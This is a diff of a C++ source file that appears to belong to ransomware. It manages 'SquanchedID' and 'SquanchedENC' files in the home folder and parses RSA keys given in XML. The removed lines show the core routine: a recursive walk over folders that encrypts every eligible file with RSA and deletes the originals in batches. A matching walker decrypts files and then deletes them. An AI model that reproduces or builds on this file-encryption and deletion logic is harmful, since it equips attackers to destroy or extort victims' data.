@@ -3,10 +3,8 @@
 #include <iostream>
 
 #include <unordered_set>
-#define SIZE_THRESHOLD 1L<<3
 
-
-std::string string_to_hex(const std::string& input)
+string string_to_hex(const string& input)
 {
 	static const char* const lut = "0123456789ABCDEF";
 	size_t len = input.length();
@@ -21,7 +19,6 @@ std::string string_to_hex(const std::string& input)
 	}
 	return output;
 }
-
 
 string find_extension(const string& path)
 {
@@ -63,60 +60,10 @@ bool is_valid_folder(const string& path)
 	return true;
 }
 
-void iterate(const path& parent, Processing_func process, RsaDecryptor rsaDecryptor) {
-	string path;
-	directory_iterator end_itr;
 
-	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
-		path = itr->path().string();
 
-		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
-			if (is_valid_folder(path))
-			{
-				iterate(path, process, rsaDecryptor);
-			}
-		}
-		else {
-			process(path, rsaDecryptor);
-			remove(path);
-		}
-	}
-}
 
-void iterate2(const path& parent, Processing_func process, RsaEncryptor rsaEncryptor,
-	std::vector<string> processedPaths)
-{
-	string path;
-	directory_iterator end_itr;
-	static long long sumSize;
 
-	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
-		path = itr->path().string();
-
-		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
-			if (is_valid_folder(path))
-			{
-				iterate2(path, process, rsaEncryptor, processedPaths);
-			}
-		}
-		else {
-			if (!do_encrypt(path)) continue;//see TODO 2 rows below
-			process(path, rsaEncryptor);
-			//TODO consider adding to "process" of encrypt, will cause an ugly wrapper for decrypt
-			processedPaths.push_back(path);
-			sumSize += file_size(path);
-			if(sumSize >= SIZE_THRESHOLD)
-			{
-				for (auto& fileToDelete : processedPaths)
-				{
-					remove(fileToDelete);
-				}
-				sumSize = 0;
-				processedPaths.clear();
-			}
-		}
-	}
-}
 
 size_t getFileSize(const string path)
 {
@@ -139,10 +86,12 @@ string get_path_to_jpeg()
 string get_path_to_id() {
 	return get_home() + R"(\SquanchedID.id)";
 }
+
 string get_path_to_ENC()
 {
 	return get_home() + R"(\SquanchedENC.id)";
 }
+
 string get_home() {
 #ifdef _WIN32
 	string path;
@@ -166,4 +115,61 @@ string get_home() {
 #endif
 }
 
+void parsePublicKey(const string& str, string& mod, string& exp)
+{
+	unsigned first = str.find("<Modulus>");
+	unsigned last = str.find(R"(</Modulus>)");
+	first += 9; //Length of "<Modulus>"
+	mod = str.substr(first, last - first);
+	first = str.find("<Exponent>");
+	first += 10; //Length of "<Exponent>"
+	last = str.find(R"(</Exponent>)");
+	exp = str.substr(first, last - first);
+}
 
+StringPrivateBlob parsePrivateKey(const string&  str)
+{
+	string mod, exp, P, Q, DP, DQ, InverseQ, D;
+	unsigned first = str.find("<Modulus>");
+	unsigned last = str.find(R"(</Modulus>)");
+	first += 9; //Length of "<Modulus>"
+	mod = str.substr(first, last - first);
+
+	first = str.find("<Exponent>");
+	first += 10; //Length of "<Exponent>"
+	last = str.find(R"(</Exponent>)");
+	exp = str.substr(first, last - first);
+
+	first = str.find("</Exponent><P>");
+	first += 14; //Length of "</Exponent><P>"
+	last = str.find(R"(</P><Q>)");
+	P = str.substr(first, last - first);
+
+	first = str.find("</P><Q>");
+	first += 7; //Length of "</P><Q>"
+	last = str.find(R"(</Q><DP>)");
+	Q = str.substr(first, last - first);
+
+	first = str.find("</Q><DP>");
+	first += 8; //Length of "</Q><DP>"
+	last = str.find(R"(</DP><DQ>)");
+	DP = str.substr(first, last - first);
+
+	first = str.find("</DP><DQ>");
+	first += 9; //Length of "</DQ><DP>"
+	last = str.find(R"(</DQ><InverseQ>)");
+	DQ = str.substr(first, last - first);
+
+	first = str.find("</DQ><InverseQ>");
+	first += 15; //Length of "</DQ><InverseQ>"
+	last = str.find(R"(</InverseQ><D>)");
+	InverseQ = str.substr(first, last - first);
+
+	first = str.find("</InverseQ><D>");
+	first += 14; //Length of "</InverseQ><D>"
+	last = str.find(R"(</D></RSAKeyValue>)");
+	D = str.substr(first, last - first);
+
+	struct StringPrivateBlob blob = {mod, exp, P, Q, DP, DQ, InverseQ, D };
+	return blob;
+}
